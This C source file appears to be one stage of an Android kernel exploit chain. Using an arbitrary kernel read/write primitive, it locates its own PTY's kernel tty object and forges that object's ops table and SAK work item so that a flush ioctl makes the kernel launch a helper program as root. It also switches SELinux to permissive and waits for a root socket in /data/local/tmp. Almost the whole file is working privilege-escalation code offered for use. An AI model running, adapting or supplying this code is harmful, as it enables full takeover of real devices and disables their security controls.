/*
 * Starts the root usermode helper through the kernel's native workqueue path.
 * A private PTY supplies a disposable work_struct and an indirect do_SAK()
 * call with the correct CFI signature. The kernel owns all queue locking and
 * accounting; no global workqueue lists or counters are modified here.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <termios.h>
#include <unistd.h>

#include "08_ashmem_configfs_rw.h"
#include "09_pipe_buffer_rw.h"
#include "10_workqueue_umh_root.h"
#include "90_diagnostic_checkpoint.h"
#include "target.h"

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"

struct umh_subprocess_info {
  uint8_t work[TARGET_UMH_SUBPROCESS_WORK_SIZE];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

struct private_pty {
  int master;
  int slave;
  char slave_name[128];
};

struct tty_kernel_object {
  uint64_t file;
  uint64_t private_data;
  uint64_t tty;
  uint64_t original_ops;
  uint8_t original_tail[sizeof(struct umh_subprocess_info)];
  uint8_t original_ops_table[TARGET_TTY_OPS_SIZE];
};

_Static_assert(sizeof(struct umh_subprocess_info) ==
                   TARGET_UMH_SUBPROCESS_INFO_SIZE,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == TARGET_UMH_COMPLETION_SIZE,
               "completion layout");
int oss_umh_runtime_layout_ok(void) {
  return offsetof(struct umh_subprocess_info, complete) ==
         TARGET_UMH_SUBPROCESS_COMPLETE_OFF;
}

static int is_direct_ptr(uint64_t value) {
  return value >= TARGET_LINEAR_MAP_BASE && value < TARGET_LINEAR_MAP_END;
}

static int is_kernel_image_ptr(uint64_t value, uint64_t kernel_base) {
  return value >= kernel_base && value < kernel_base + TARGET_KERNEL_IMAGE_SPAN;
}

static int kernel_image_linear_alias(uint64_t target_addr,
                                     uint64_t memstart_addr,
                                     uint64_t kimage_voffset,
                                     uint64_t *linear_alias) {
  if (!linear_alias || (memstart_addr & TARGET_PAGE_MASK) != 0 ||
      (kimage_voffset & TARGET_PAGE_MASK) != 0 ||
      target_addr < kimage_voffset) {
    return 0;
  }
  uint64_t physical = target_addr - kimage_voffset;
  if (physical < memstart_addr) {
    return 0;
  }
  uint64_t linear_offset = physical - memstart_addr;
  if (linear_offset >= TARGET_LINEAR_MAP_END - TARGET_LINEAR_MAP_BASE) {
    return 0;
  }
  *linear_alias = TARGET_LINEAR_MAP_BASE + linear_offset;
  return 1;
}

static uint64_t load_u64(const void *buffer, size_t offset) {
  uint64_t value = 0;
  memcpy(&value, (const uint8_t *)buffer + offset, sizeof(value));
  return value;
}

static void store_u64(void *buffer, size_t offset, uint64_t value) {
  memcpy((uint8_t *)buffer + offset, &value, sizeof(value));
}

static int pipe_read32(int fd, uint64_t target_addr, uint32_t *value) {
  return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
}

static int pipe_read64(int fd, uint64_t target_addr, uint64_t *value) {
  return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
}

static int pipe_write64(int fd, uint64_t target_addr, uint64_t value) {
  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
}

static int open_private_pty(struct private_pty *pty) {
  memset(pty, 0, sizeof(*pty));
  pty->master = -1;
  pty->slave = -1;
  pty->master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (pty->master < 0 || grantpt(pty->master) != 0 ||
      unlockpt(pty->master) != 0 ||
      ptsname_r(pty->master, pty->slave_name, sizeof(pty->slave_name)) != 0) {
    return 0;
  }
  pty->slave = open(pty->slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  return pty->slave >= 0;
}

static void close_private_pty(struct private_pty *pty) {
  if (pty->slave >= 0) close(pty->slave);
  if (pty->master >= 0) close(pty->master);
  pty->slave = -1;
  pty->master = -1;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return 0;
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

static uint64_t find_current_task(int fd, uint64_t kernel_base,
                                  uint64_t memstart_addr,
                                  uint64_t kimage_voffset) {
  uint64_t list_head = kernel_base + TARGET_INIT_TASK_OFF + TARGET_TASK_TASKS_OFF;
  uint64_t list_previous_alias = 0;
  uint64_t node = 0;
  if (!kernel_image_linear_alias(list_head + sizeof(uint64_t), memstart_addr,
                                 kimage_voffset, &list_previous_alias) ||
      !pipe_read64(fd, list_previous_alias, &node)) {
    return 0;
  }
  pid_t wanted = getpid();
  for (int walked = 0; walked < 16384; walked++) {
    if (!is_direct_ptr(node) || node == list_head) break;
    uint64_t task = node - TARGET_TASK_TASKS_OFF;
    uint32_t pid = 0;
    uint64_t previous = 0;
    if (!pipe_read32(fd, task + TARGET_TASK_PID_OFF, &pid) ||
        !pipe_read64(fd, task + TARGET_TASK_TASKS_OFF + sizeof(uint64_t), &previous)) {
      break;
    }
    if ((pid_t)pid == wanted) return task;
    node = previous;
  }
  return 0;
}

static int resolve_tty_object(int fd, uint64_t kernel_base,
                              uint64_t memstart_addr,
                              uint64_t kimage_voffset, int tty_fd,
                              struct tty_kernel_object *object) {
  memset(object, 0, sizeof(*object));
  uint64_t task = find_current_task(fd, kernel_base, memstart_addr,
                                    kimage_voffset);
  uint64_t files = 0, fdt = 0, fd_array = 0;
  uint32_t max_fds = 0;
  if (!task || !pipe_read64(fd, task + TARGET_TASK_FILES_OFF, &files) ||
      !is_direct_ptr(files) || !pipe_read64(fd, files + TARGET_FILES_FDT_OFF, &fdt) ||
      !is_direct_ptr(fdt) ||
      !pipe_read32(fd, fdt + TARGET_FDTABLE_MAX_FDS_OFF, &max_fds) ||
      tty_fd < 0 || (uint32_t)tty_fd >= max_fds ||
      !pipe_read64(fd, fdt + TARGET_FDTABLE_FD_OFF, &fd_array) ||
      !is_direct_ptr(fd_array) ||
      !pipe_read64(fd, fd_array + (uint64_t)tty_fd * sizeof(uint64_t),
                   &object->file) ||
      !is_direct_ptr(object->file) ||
      !pipe_read64(fd, object->file + TARGET_FILE_PRIVATE_DATA_OFF,
                   &object->private_data) ||
      !is_direct_ptr(object->private_data) ||
      !pipe_read64(fd, object->private_data + TARGET_TTY_FILE_TTY_OFF, &object->tty) ||
      !is_direct_ptr(object->tty)) {
    return 0;
  }

  uint64_t private_file = 0;
  uint64_t original_ops_alias = 0;
  uint32_t magic = 0, index = 0;
  uint64_t port = 0;
  if (!pipe_read64(fd, object->private_data + TARGET_TTY_FILE_FILE_OFF,
                   &private_file) ||
      private_file != object->file ||
      !pipe_read32(fd, object->tty + TARGET_TTY_MAGIC_OFF, &magic) ||
      magic != TARGET_TTY_MAGIC ||
      !pipe_read32(fd, object->tty + TARGET_TTY_INDEX_OFF, &index) || index > 4095 ||
      !pipe_read64(fd, object->tty + TARGET_TTY_OPS_OFF, &object->original_ops) ||
      !is_kernel_image_ptr(object->original_ops, kernel_base) ||
      !kernel_image_linear_alias(object->original_ops, memstart_addr,
                                 kimage_voffset, &original_ops_alias) ||
      !pipe_read64(fd, object->tty + TARGET_TTY_PORT_OFF, &port) ||
      !is_direct_ptr(port) ||
      !oss_pipe_rw_read(fd, object->tty + TARGET_TTY_SAK_WORK_OFF,
                        object->original_tail,
                        sizeof(object->original_tail)) ||
      !oss_pipe_rw_read(fd, original_ops_alias, object->original_ops_table,
                        sizeof(object->original_ops_table))) {
    return 0;
  }

  uint64_t work_addr = object->tty + TARGET_TTY_SAK_WORK_OFF;
  uint64_t entry_addr = work_addr + TARGET_WORK_ENTRY_OFF;
  uint64_t work_data = load_u64(object->original_tail, TARGET_WORK_DATA_OFF);
  uint64_t entry_next = load_u64(object->original_tail, TARGET_WORK_ENTRY_OFF);
  uint64_t entry_prev =
      load_u64(object->original_tail, TARGET_WORK_ENTRY_OFF + sizeof(uint64_t));
  uint64_t work_func = load_u64(object->original_tail, TARGET_WORK_FUNC_OFF);
  if ((work_data & TARGET_WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
      entry_prev != entry_addr || work_func != kernel_base + TARGET_DO_SAK_WORK_OFF) {
    fprintf(stderr,
            "[root_umh] private PTY SAK work rejected data=%016llx "
            "entry=%016llx/%016llx func=%016llx\n",
            (unsigned long long)work_data, (unsigned long long)entry_next,
            (unsigned long long)entry_prev, (unsigned long long)work_func);
    return 0;
  }
  return 1;
}

static int restore_tty_object(int fd, const struct tty_kernel_object *object,
                              int restore_ops, int restore_tail) {
  int ok = 1;
  if (restore_ops &&
      !pipe_write64(fd, object->tty + TARGET_TTY_OPS_OFF, object->original_ops)) {
    ok = 0;
  }
  if (restore_tail &&
      !oss_pipe_rw_write(fd, object->tty + TARGET_TTY_SAK_WORK_OFF,
                         object->original_tail,
                         sizeof(object->original_tail))) {
    ok = 0;
  }
  if (!ok) return 0;

  uint64_t ops = 0;
  uint8_t tail[sizeof(object->original_tail)];
  if (restore_ops &&
      (!pipe_read64(fd, object->tty + TARGET_TTY_OPS_OFF, &ops) ||
       ops != object->original_ops)) {
    return 0;
  }
  if (restore_tail &&
      (!oss_pipe_rw_read(fd, object->tty + TARGET_TTY_SAK_WORK_OFF, tail,
                         sizeof(tail)) ||
       memcmp(tail, object->original_tail, sizeof(tail)) != 0)) {
    return 0;
  }
  return 1;
}

int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
                                uint64_t page_base,
                                uint64_t memstart_addr,
                                uint64_t kimage_voffset,
                                const char *root_umh_path,
                                int32_t *kernel_state,
                                int32_t irreversible_state) {
  struct private_pty pty;
  struct tty_kernel_object tty_object;
  struct umh_kernel_data umh_data;
  struct umh_subprocess_info fake;
  uint8_t fake_ops[TARGET_TTY_OPS_SIZE];
  uint8_t original_selinux = 1;
  int selinux_changed = 0;
  int ops_published = 0;
  int tail_published = 0;
  int work_may_be_queued = 0;
  int safe_to_close = 0;
  int result = 0;

  if (!open_private_pty(&pty)) {
    fprintf(stderr, "[root_umh] private PTY open failed errno=%d\n", errno);
    close_private_pty(&pty);
    return 0;
  }
  if (!resolve_tty_object(fd, kernel_base, memstart_addr, kimage_voffset,
                          pty.slave, &tty_object)) {
    fprintf(stderr, "[root_umh] private PTY kernel object resolution failed\n");
    close_private_pty(&pty);
    return 0;
  }

  memset(&umh_data, 0, sizeof(umh_data));
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    fprintf(stderr, "[root_umh] helper path too long\n");
    close_private_pty(&pty);
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uint64_t umh_data_addr = page_base + TARGET_ROOT_UMH_DATA_LIVE_OFF;
  uint64_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uint64_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uint64_t path_addr = umh_data_addr + offsetof(struct umh_kernel_data, path);
  uint64_t arg_addr = umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uint64_t uid_addr = umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uint64_t argv_addr = umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uint64_t envp_addr = umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  memcpy(&fake, tty_object.original_tail, sizeof(fake));
  store_u64(fake.work, TARGET_WORK_FUNC_OFF,
            kernel_base + TARGET_CALL_USERMODEHELPER_EXEC_WORK_OFF);
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;
  fake.wait = 0;
  fake.retval = 0;
  fake.init = 0;
  fake.cleanup = 0;
  fake.data = 0;

  memcpy(fake_ops, tty_object.original_ops_table, sizeof(fake_ops));
  store_u64(fake_ops, TARGET_TTY_OPS_FLUSH_BUFFER_OFF, kernel_base + TARGET_DO_SAK_OFF);

  uint64_t fake_ops_addr = page_base + TARGET_ROOT_TTY_OPS_LIVE_OFF;
  uint64_t selinux_addr = kernel_base + TARGET_SELINUX_STATE_ENFORCING_OFF;
  uint64_t selinux_alias = 0;
  if (!kernel_image_linear_alias(selinux_addr, memstart_addr, kimage_voffset,
                                 &selinux_alias)) {
    fprintf(stderr,
            "[root_umh] staging step=selinux-alias failed addr=%016llx\n",
            (unsigned long long)selinux_addr);
    close_private_pty(&pty);
    return 0;
  }
  unlink(ROOT_SOCKET_PATH);
  if (!oss_pipe_rw_read(fd, selinux_alias, &original_selinux,
                        sizeof(original_selinux))) {
    fprintf(stderr,
            "[root_umh] staging step=selinux-read failed addr=%016llx "
            "alias=%016llx errno=%d\n",
            (unsigned long long)selinux_addr,
            (unsigned long long)selinux_alias, errno);
    close_private_pty(&pty);
    return 0;
  }
  if (original_selinux > 1) {
    fprintf(stderr,
            "[root_umh] staging step=selinux-value failed value=%u\n",
            original_selinux);
    close_private_pty(&pty);
    return 0;
  }
  if (!oss_pipe_rw_write(fd, umh_data_addr, &umh_data, sizeof(umh_data))) {
    fprintf(stderr,
            "[root_umh] staging step=umh-data-write failed addr=%016llx "
            "errno=%d\n",
            (unsigned long long)umh_data_addr, errno);
    close_private_pty(&pty);
    return 0;
  }
  if (!oss_pipe_rw_write(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
    fprintf(stderr,
            "[root_umh] staging step=tty-ops-write failed addr=%016llx "
            "errno=%d\n",
            (unsigned long long)fake_ops_addr, errno);
    close_private_pty(&pty);
    return 0;
  }

  if (kernel_state) {
    __atomic_store_n(kernel_state, irreversible_state, __ATOMIC_RELEASE);
  }
  tail_published = 1;
  if (!oss_pipe_rw_write(fd, tty_object.tty + TARGET_TTY_SAK_WORK_OFF, &fake,
                         sizeof(fake))) {
    fprintf(stderr, "[root_umh] private PTY subprocess publish failed\n");
    goto out;
  }
  ops_published = 1;
  if (!pipe_write64(fd, tty_object.tty + TARGET_TTY_OPS_OFF, fake_ops_addr)) {
    fprintf(stderr, "[root_umh] private PTY ops publish failed\n");
    goto out;
  }

  uint8_t permissive = 0;
  selinux_changed = original_selinux != permissive;
  uint8_t selinux_readback = 0xff;
  if (!oss_pipe_rw_write(fd, selinux_alias, &permissive,
                         sizeof(permissive)) ||
      !oss_pipe_rw_read(fd, selinux_alias, &selinux_readback,
                        sizeof(selinux_readback)) ||
      selinux_readback != permissive) {
    fprintf(stderr,
            "[root_umh] selinux pipe write failed alias=%016llx got=%u "
            "errno=%d\n",
            (unsigned long long)selinux_alias, selinux_readback, errno);
    goto out;
  }
  oss_diag_checkpoint("umh-pty-prequeue");

  errno = 0;
  int ioctl_result = ioctl(pty.slave, TCFLSH, TCOFLUSH);
  work_may_be_queued = ioctl_result == 0;
  int ioctl_error = ioctl_result == 0 ? 0 : errno;
  int ops_restored = restore_tty_object(fd, &tty_object, 1, 0);
  if (ops_restored) ops_published = 0;
  if (ioctl_result != 0 || !ops_restored) {
    fprintf(stderr,
            "[root_umh] private PTY queue failed ioctl=%d errno=%d "
            "ops_restore=%d\n",
            ioctl_result, ioctl_error, ops_restored);
    if (ioctl_result != 0 && ops_restored &&
        restore_tty_object(fd, &tty_object, 0, 1)) {
      tail_published = 0;
      safe_to_close = 1;
    }
    goto out;
  }

  uint32_t complete_done = 0;
  for (int i = 0; i < 5000 && !complete_done; i++) {
    if (!pipe_read32(fd, completion_addr, &complete_done)) {
      fprintf(stderr, "[root_umh] completion read failed\n");
      goto out;
    }
    if (!complete_done) usleep(1000);
  }

  int socket_ok = 0;
  if (complete_done) {
    for (int i = 0; i < 500; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  int tail_restored = 0;
  if (complete_done) {
    tail_restored = restore_tty_object(fd, &tty_object, 0, 1);
    if (tail_restored) {
      tail_published = 0;
      safe_to_close = 1;
    }
  }
  fprintf(stderr,
          "[root_umh] result complete=%u socket=%d restore=%d "
          "tty=%016llx work=%016llx\n",
          complete_done, socket_ok, tail_restored,
          (unsigned long long)tty_object.tty,
          (unsigned long long)(tty_object.tty + TARGET_TTY_SAK_WORK_OFF));
  result = socket_ok && tail_restored;

out:
  if (ops_published && restore_tty_object(fd, &tty_object, 1, 0)) {
    ops_published = 0;
  }
  if (tail_published && !work_may_be_queued &&
      restore_tty_object(fd, &tty_object, 0, 1)) {
    tail_published = 0;
  }
  if (!tail_published) safe_to_close = 1;
  if (!result && selinux_changed) {
    int restored = oss_pipe_rw_write(fd, selinux_alias, &original_selinux,
                                     sizeof(original_selinux));
    fprintf(stderr, "[root_umh] selinux restore=%d value=%u\n", restored,
            original_selinux);
  }
  if (safe_to_close && !ops_published) {
    close_private_pty(&pty);
  } else {
    fprintf(stderr,
            "[root_umh] private PTY pinned after unsafe restoration state "
            "ops=%d tail=%d fds=%d/%d\n",
            ops_published, tail_published, pty.master, pty.slave);
  }
  oss_diag_checkpoint(result ? "umh-root-socket-ok" : "umh-root-socket-miss");
  return result;
}

int root_umh_install_fd(int fd, uint64_t kernel_base, uint64_t page_base,
                        uint64_t memstart_addr, uint64_t kimage_voffset,
                        const char *root_umh_path) {
  return root_umh_install_fd_tracked(
      fd, kernel_base, page_base, memstart_addr, kimage_voffset,
      root_umh_path, NULL, 0);
}

int root_umh_install(uint64_t kernel_base, uint64_t page_base,
                     const char *root_umh_path) {
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    fprintf(stderr, "[root_umh] open resolved ashmem node failed\n");
    return 0;
  }
  uint64_t ashmem_misc_fops_addr =
      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
  int verified = oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
  uint64_t memstart_addr = 0;
  uint64_t kimage_voffset = 0;
  int alias_inputs =
      verified &&
      oss_kernel_read(fd, kernel_base + TARGET_MEMSTART_ADDR_OFF,
                      &memstart_addr, sizeof(memstart_addr)) &&
      oss_kernel_read(fd, kernel_base + TARGET_KIMAGE_VOFFSET_OFF,
                      &kimage_voffset, sizeof(kimage_voffset));
  int pipe_ready = alias_inputs &&
                   oss_pipe_rw_install(fd, kernel_base, page_base);
  int rooted =
      pipe_ready && root_umh_install_fd(fd, kernel_base, page_base,
                                        memstart_addr, kimage_voffset,
                                        root_umh_path);
  close(fd);
  return rooted;
}
